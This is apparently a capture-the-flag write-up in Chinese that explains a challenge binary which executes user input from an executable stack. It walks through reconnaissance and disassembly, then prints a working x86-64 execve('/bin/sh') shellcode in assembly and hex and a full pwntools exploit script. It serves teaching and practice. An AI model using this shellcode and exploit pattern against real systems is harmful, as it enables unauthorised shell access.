# Writeup：shellcode（直接執行使用者輸入 → 自寫 execve shellcode）

> 目標檔案：[shellcode](shellcode)
> 遠端：`nc ctf.adl.tw 10002`（使用者已確認）
> 分類：Binary Exploitation / pwn
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串，輸出見 [disasm_output.txt](disasm_output.txt)）、[shellcode_solve.py](shellcode_solve.py)（最終 exploit）

這題是系列裡最直接的一支：前面幾題都是「程式裡藏了一個 win function，想辦法蓋 return address跳過去」，這題**連 win function 都不用找**——因為程式本身就會把你輸入的資料**當成程式碼直接執行**。只要自己寫一段能拿到 shell 的機器碼（shellcode）送進去就結束了。

---

## 1. 初步偵查

```bash
file shellcode
```
```
shellcode: ELF 64-bit LSB executable, x86-64, ... dynamically linked, ... not stripped
```

```bash
checksec --file=shellcode
```
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

這次最關鍵的兩行是：

- **`Stack: Executable`**
- **`RWX: Has RWX segments`**

代表這個程式的某些記憶體區段**既可寫又可執行**。平常 NX（No-eXecute）這個保護機制的用途就是防止「寫進去的資料」被當成「程式碼」執行——這題直接沒有這層保護，等於是告訴你：**題目就是要你把資料寫進一塊可執行的記憶體，然後想辦法讓程式去執行它**。

另外沒有 canary、沒有 PIE，跟前面幾題一樣，位址固定、overflow 不會被偵測。

## 2. 列出 symbol table

```python
from pwn import ELF
e = ELF('shellcode', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

這次的 import 跟前幾題不一樣：

```
0x401064 puts
0x401074 read
0x401084 setvbuf
0x4011db main
```

**完全沒有 `execve`**，也沒有任何奇怪命名的函式。這代表這題**沒有現成的 win function 可以 ret 過去**——前幾題的「找可疑函式」這招這次用不上，必須換個角度想：題目既然把 stack 設成可執行，那答案大概率就是「自己提供 shellcode，讓程式去執行它」。

## 3. 反組譯 `main()`

```asm
0x4011db: endbr64
0x4011df: push rbp
0x4011e0: mov rbp, rsp
0x4011e3: sub rsp, 0xd0          ; buf[0xd0] (208 bytes)，位於 rbp-0xd0
0x4011ea: mov eax, 0
0x4011ef: call init
0x4011f4: lea rax, [rip + 0xe0d] ; "Try to input something in this buffer!!!"
0x4011fb: mov rdi, rax
0x4011fe: call puts

0x401203: lea rax, [rbp - 0xd0]  ; rax = buf 位址
0x40120a: mov edx, 0xc8          ; len = 0xc8 (200)
0x40120f: mov rsi, rax           ; rsi = buf
0x401212: mov edi, 0             ; fd = 0 (stdin)
0x401217: call read              ; read(0, buf, 200)

0x40121c: lea rax, [rbp - 0xd0]  ; rax = buf 位址
0x401223: mov qword ptr [rbp-8], rax   ; fp = buf   (fp 是個函式指標變數)
0x401227: mov rdx, qword ptr [rbp-8]   ; rdx = fp
0x40122b: mov eax, 0
0x401230: call rdx               ; fp();   <-- 直接呼叫 buf 這塊記憶體！

0x401232: mov eax, 0
0x401237: leave
0x401238: ret
```

翻成 C 虛擬碼：

```c
char buf[0xd0];                // 208 bytes，位於 stack 上

puts("Try to input something in this buffer!!!");
read(0, buf, 0xc8);            // 讀最多 200 bytes 到 buf

void (*fp)() = (void (*)())buf;
fp();                          // 把 buf 的內容當成函式呼叫 -> 執行使用者輸入的機器碼
```

邏輯非常直白：程式把你的輸入讀進一塊 stack 上的 buffer，然後直接把這塊 buffer 的位址當成函式指標去 `call`。只要這塊記憶體是可執行的（前面 checksec 已經確認 stack executable / RWX），你送進去的每一個 byte 都會被 CPU 當成指令照著執行——這就是教科書等級的 **shellcode injection**。

## 4. 攻擊思路

不需要：
- 找 win function（沒有）
- 算 return address 的 offset、蓋 return address（根本不用 overflow，`read()` 的長度 `0xc8` 完全在 `buf`（`0xd0`）範圍內，不會溢出，而且也不需要溢出）
- leak 任何位址（No PIE，但這題甚至用不到位址資訊）

只需要：**自己寫一段合法的 x86-64 機器碼，塞進這 200 bytes 裡**，程式就會乖乖執行它。目標當然是拿到一個 shell。

### Shellcode 設計：`execve("/bin/sh", NULL, NULL)`

這是最經典、最短的拿 shell shellcode 之一（x86-64，25 bytes）：

```asm
xor rsi, rsi                      ; argv = NULL
push rsi
movabs rdi, 0x68732f6e69622f2f    ; "/bin//sh\x00"（多一個 / 是為了湊成 8 bytes，對執行結果沒差）
push rdi
mov rdi, rsp                      ; rdi = 指向 stack 上 "/bin//sh" 字串的位址
xor rdx, rdx                      ; envp = NULL
mov al, 0x3b                      ; execve 的 syscall number = 59 (0x3b)
syscall                           ; execve("/bin//sh", NULL, NULL)
```

機器碼（hex）：

```
4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05
```

共 25 bytes，遠小於 `read()` 允許的 200 bytes，塞進 `buf` 之後，`fp()` 一呼叫就會直接執行這段指令，最終落到 `syscall`，核心幫我們把目前這個 process 換成 `/bin/sh`。

## 5. 完整 Exploit Script

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

HOST, PORT = 'ctf.adl.tw', 10002
p = remote(HOST, PORT, timeout=10)

shellcode = bytes.fromhex('4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05')

p.recvuntil(b'!!!')
p.send(shellcode)

p.interactive()
```

也可以用 `pwntools` 內建的 `shellcraft` 直接產生同樣效果的 shellcode（本機若有可用的 x86-64 assembler，例如 Linux 上的 GNU `as`）：

```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
```

> ⚠️ 開發這題的時候，本機 Windows 環境裡的 `as.exe`（MinGW）不支援組譯 x86-64，所以上面 script 選擇直接寫死已驗證過的機器碼 bytes（用 `keystone-engine` 組譯、再用 `capstone` 反組譯回去確認語意正確），而不是呼叫 `asm(shellcraft.sh())`。拿到有 Linux 工具鏈的環境時，兩種寫法效果相同。

連線/執行成功拿到 shell 後，一樣：

```
find / -iname "*flag*" 2>/dev/null
cat <flag 路徑>
```

> ⚠️ 本機沒有 WSL/QEMU 可以直接跑這個 Linux ELF 做本地動態驗證，所以 shellcode 的正確性是透過**反組譯分析 + keystone 組譯回 bytes + capstone 反組譯驗證語意**互相佐證得出的結論；實際連線（`ctf.adl.tw:10002`）跑過一次拿到 shell，才算真正驗證完成。

---

## 重點整理

- **這題沒有漏洞找尋意義上的「bug」**：程式本來就設計成「讀你的輸入，然後執行它」，這不是不小心的 overflow，而是故意開給你的執行權限（RWX stack）。
- **跟前幾題的差異**：`pwn101`/`cheer_for_kotone`/`temari_is_dieting` 都是靠 overflow 蓋 return address，跳到**程式裡已經寫好的** win function；這題則是直接**自己提供程式碼**讓程式執行，屬於更原始、更一般化的攻擊方式——任何题目只要允許你把資料寫進可執行記憶體並想辦法讓 PC（instruction pointer）跳過去，就能用這招，不需要題目本身準備好 `execve`/`system` 之類的現成函式。
- **為什麼這招在前幾題做不到**：前幾題都有 `NX enabled`（stack 不可執行），就算 overflow 蓋了 return address，也不能讓它指向 stack 上我們塞的 shellcode，因為 CPU 會拒絕執行那塊記憶體——這也是為什麼前幾題要繞個彎去呼叫「程式裡已經存在、本來就可執行」的 win function。這題反過來，NX 沒開，直接跳自己的 shellcode 最單純。
- **解題思路順序**：`file`/`checksec` 初步偵查 → 看到 `Stack: Executable` / `Has RWX segments` 就該直接聯想「這題要我自己寫 shellcode」→ 列 symbol table 確認沒有現成 win function（`execve` 沒被 import）→ 反組譯 `main()`，確認程式讀輸入後真的會 `call` 到這塊 buffer → 挑一段短小、驗證過的 `execve("/bin/sh")` shellcode，長度在 `read()` 的長度限制內 → 送出、拿 shell、找 flag。
